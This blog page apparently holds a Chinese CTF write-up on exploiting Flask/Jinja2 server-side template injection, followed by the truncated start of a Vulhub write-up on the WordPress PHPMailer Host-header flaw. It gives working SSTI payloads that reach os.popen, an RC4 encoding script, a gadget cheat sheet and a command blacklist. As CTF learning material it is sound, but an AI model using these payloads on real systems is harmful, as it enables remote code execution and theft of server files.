<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155613805.png" alt="image-20230112155613805"></p>
<p>看来还得输入参数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155641182.png" alt="image-20230112155641182"></p>
<p>随便输点，发现报错了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155719927.png" alt="image-20230112155719927"></p>
<p>依据报错信息可以判断用的是<code>python2</code>下<code>flask</code>，报错信息中有比较关键的部分</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File &quot;/app/app.py&quot;, line 35, in secret</span><br><span class="line">a=render_template_string(safe(deS))</span><br></pre></td></tr></table></div></figure>

<p>这个函数<code>render_template_string</code>通常和<code>SSTI</code>模板注入有关，和之前的<code>php</code>中的相关模板注入有点类似，而且在火狐浏览器中居然可以点开查看代码，在<code>edge</code>和<code>chrome</code>都不行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112161329622.png" alt="image-20230112161329622"></p>
<p>可以看到，那个<code>secret</code>应该是我们控制的，因为没有<code>secret</code>的时候，确实输出了那个文字，有了就会输出其他的。</p>
<p>中间看代码，将输入的<code>secret</code>通过<code>rc4</code>进行解密，那个<code>HereIsTreasure</code>应该就是密钥，然后字节放入<code>render_template_string</code>函数中，那么就肯定存在<code>SSTI</code>模板注入</p>

        <h2 id="前置知识-2"   >
          <a href="#前置知识-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>了解<code>flask</code>的<code>SSTI</code>还是需要一些前置知识的，如下代码示例</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&#123;&#123;&#x27;abc&#x27;.__class__&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>

<p>当访问<code>ip:port/test</code>时，出现如下情况</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162026870.png" alt="image-20230112162026870"></p>
<p>返回了一个类名字，这个其实就相当于在<code>python</code>里面执行了<code>&#39;abc&#39;.__class__</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162115798.png" alt="image-20230112162115798"></p>
<p>那么对应的，这个标签<code>&#123;&#123;xxx&#125;&#125;</code>，修改里面的<code>xxx</code>，即可获得任意<code>python</code>代码执行的能力。但是这里的代码执行和正常的<code>python</code>还是有点区别的，比如如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&#123;&#123;print(&#x27;aaaa&#x27;)&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>

<p>就会出现如下情况</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162739395.png" alt="image-20230112162739395"></p>
<p>原因就在于使用的模板引擎是<code>jinja2</code>，它有自己的一套规则，基本的语法如下</p>
<ul>
<li>控制结构 <code>&#123;% %&#125;</code></li>
<li>变量取值 <code>&#123;&#123; &#125;&#125;</code></li>
<li>注释 <code>&#123;# #&#125;</code></li>
</ul>
<p>那么将刚刚的示例修改一下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&#123;% for i in range(3) %&#125;&quot;</span> \</span><br><span class="line">               <span class="string">&quot;&#123;&#123;i&#125;&#125;&quot;</span> \</span><br><span class="line">               <span class="string">&quot;&#123;% endfor %&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>

<p>访问之后效果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112163519711.png" alt="image-20230112163519711"></p>
<p>可以看到相当于执行了对应的<code>jinja2</code>代码，那么针对<code>flask</code>的<code>SSTI</code>模板注入，其实质就是执行<code>jinja2</code>代码。</p>
<p>而相对于<code>jinja2</code>代码执行，用的最多的就是变量<code>&#123;&#123;i&#125;&#125;</code>取值，利用变量取值就可以获取到<code>python</code>里面各式各样的类和其中对应的方法，那么传入相关参数就能调用到相关的<code>python</code>代码了呀。</p>
<p>比如最开始的<code>&#39;abc&#39;.__class__</code>，可以通过它来获取到基类<code>object</code>然后获取到后面的对应所有需要的类</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112164326132.png" alt="image-20230112164326132"></p>
<p>而很常用的<code>popen</code>函数，就会在某个类里存在，那么就需要去寻找，比如在<code>python3</code>里面有<code>&#39;abc&#39;.__class__.__base__.__subclasses__()[134].__init__.__globals__[&#39;popen&#39;]</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112164500524.png" alt="image-20230112164500524"></p>
<p>那么对应传入参数就可以执行函数了，常用形式如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;abc&#x27;.__class__.__base__.__subclasses__()[134].__init__.__globals__[&#x27;popen&#x27;](&#x27;ipconfig&#x27;).read()</span><br></pre></td></tr></table></div></figure>

<p>这些相关常用属性也有相关总结，参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/zbbjya/article/details/124185476" >(48条消息) SSTI知识点与题型_zbbjya的博客-CSDN博客_ssti大全</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#python2" >python 沙箱逃逸与SSTI ~ Misaki’s Blog (misakikata.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a/b)</span><br><span class="line">request.json		 post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="题目-1"   >
          <a href="#题目-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2>
      <p>那么有了前置知识，这个就很好做了，利用相关的<code>payload</code>即可，在<code>flask</code>中有一个很常用的<code>config</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&#123;&#123;config&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112165239719.png" alt="image-20230112165239719"></p>
<p>上面总结也有提到，如下<code>payload</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()</span><br></pre></td></tr></table></div></figure>

<p>但是这里还存在一个<code>rc4</code>加解密，使用不知道哪位师傅的脚本即可解决</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="comment">#print(&quot;加密后的字符串是：\n%s&quot; %cipher)</span></span><br><span class="line">    enc_url = parse.quote(cipher)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的url编码:\n&quot;</span> + enc_url)</span><br><span class="line">    <span class="comment">#print(&quot;加密后的输出(经过base64编码):&quot;)</span></span><br><span class="line">    <span class="comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&#x27;&#x27;&#x27;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>


        <h2 id="题外话"   >
          <a href="#题外话" class="heading-link"><i class="fas fa-link"></i></a><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2>
      <p>在获取到网站源码之后，发现其实是有黑名单过滤的</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe</span>(<span class="params">s</span>):</span></span><br><span class="line">        black=[<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>,  <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;join&#x27;</span> <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;del&#x27;</span>, <span class="string">&#x27;rm&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>, <span class="string">&#x27;catch_warnings&#x27;</span>, <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;reload&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;kill&#x27;</span>, <span class="string">&#x27;func_code&#x27;</span> ]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> black:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span>+ i +<span class="string">&#x27;\&#x27; is not allowed. Secret is &#x27;</span> + s</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    secret=request.args.get(<span class="string">&#x27;secret&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></div></figure>

<p>但是他这个过滤，其实只是给我们的输入加了一些字符，比如里面有<code>class</code>，就会变成<code>&#39;class&#39; is not allowed. Secret is xxxx</code>，而在<code>jinja2</code>里，对于普通的字符，即不符合语法规则的字符，是会原样输出的，比如如下代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;1234213&#123;&#123;&#x27;abc&#x27;.__class__.__base__.__subclasses__()[134].__init__.__globals__[&#x27;popen&#x27;](&#x27;ipconfig&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>

<p>访问结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112170040620.png" alt="image-20230112170040620"></p>
<p>其实对于代码执行一点影响没有，相当于只是一个网站的文本字符而已。</p>
<p>最终<code>payload</code>如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/03/07/VulHub%E5%88%B7%E9%A2%98/">Vulhub刷题</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-03-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="wordpress-pwnscriptum"   >
          <a href="#wordpress-pwnscriptum" class="heading-link"><i class="fas fa-link"></i></a><a href="#wordpress-pwnscriptum" class="headerlink" title="wordpress-pwnscriptum"></a>wordpress-pwnscriptum</h1>
      
        <h2 id="漏洞原理"   >
          <a href="#漏洞原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2>
      
        <h3 id="wordpress部分"   >
          <a href="#wordpress部分" class="heading-link"><i class="fas fa-link"></i></a><a href="#wordpress部分" class="headerlink" title="wordpress部分"></a>wordpress部分</h3>
      <p><code>wordpress</code>在发送邮件的时候，调用的是如下代码</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress-4.6 wp-includes pluggable.php 350</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$from_name</span> = apply_filters( <span class="string">&#x27;wp_mail_from_name&#x27;</span>, <span class="variable">$from_name</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$phpmailer</span>-&gt;setFrom( <span class="variable">$from_email</span>, <span class="variable">$from_name</span> );</span><br></pre></td></tr></table></div></figure>

<p>这里的<code>$from_email</code>是可控的，实质就是<code>http</code>中传入的<code>Host</code>字段经过一些过滤得到的，如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress-4.6 wp-includes pluggable.php 324</span></span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>( <span class="variable">$from_email</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Get the site domain and get rid of www.</span></span><br><span class="line">    <span class="variable">$sitename</span> = strtolower( <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>] );</span><br><span class="line">    <span class="keyword">if</span> ( substr( <span class="variable">$sitename</span>, <span class="number">0</span>, <span class="number">4</span> ) == <span class="string">&#x27;www.&#x27;</span> ) &#123;</span><br><span class="line">        <span class="variable">$sitename</span> = substr( <span class="variable">$sitename</span>, <span class="number">4</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$from_email</span> = <span class="string">&#x27;wordpress@&#x27;</span> . <span class="variable">$sitename</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Filters the email address to send from.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 2.2.0</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $from_email Email address to send from.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"><span class="variable">$from_email</span> = apply_filters( <span class="string">&#x27;wp_mail_from&#x27;</span>, <span class="variable">$from_email</span> );</span><br></pre></td></tr></table></div></figure>

<p>这个<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>就是传入的<code>Host</code>字段。</p>

        <h3 id="phpmailer部分"   >
          <a href="#phpmailer部分" class="heading-link"><i class="fas fa-link"></i></a><a href="#phpmailer部分" class="headerlink" title="phpmailer部分"></a>phpmailer部分</h3>
      <p>之前讲到的<code>$phpmailer-&gt;setFrom( $from_email, $from_name );</code>，调用的就是<code>phpmailer</code>组件的相关代码，该函数如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpmailer-5.2.10 class.phpmailer.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setFrom</span>(<span class="params"><span class="variable">$address</span>, <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$auto</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$address</span> = trim(<span class="variable">$address</span>);</span><br><span class="line">	<span class="comment">//......中间是一些校验`$address`的,以及无关代码,本人水平太低,不太会绕过,直接略过,具体可看p神的</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$auto</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Sender = <span class="variable">$address</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后当在<code>wordpress</code>中调用<code>phpmailer.send()</code>发送邮件时，对应代码如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;preSend()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;postSend();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (phpmailerException <span class="variable">$exc</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mailHeader = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setError(<span class="variable">$exc</span>-&gt;getMessage());</span><br><span class="line">        <span class="keyword">if</span> (<span 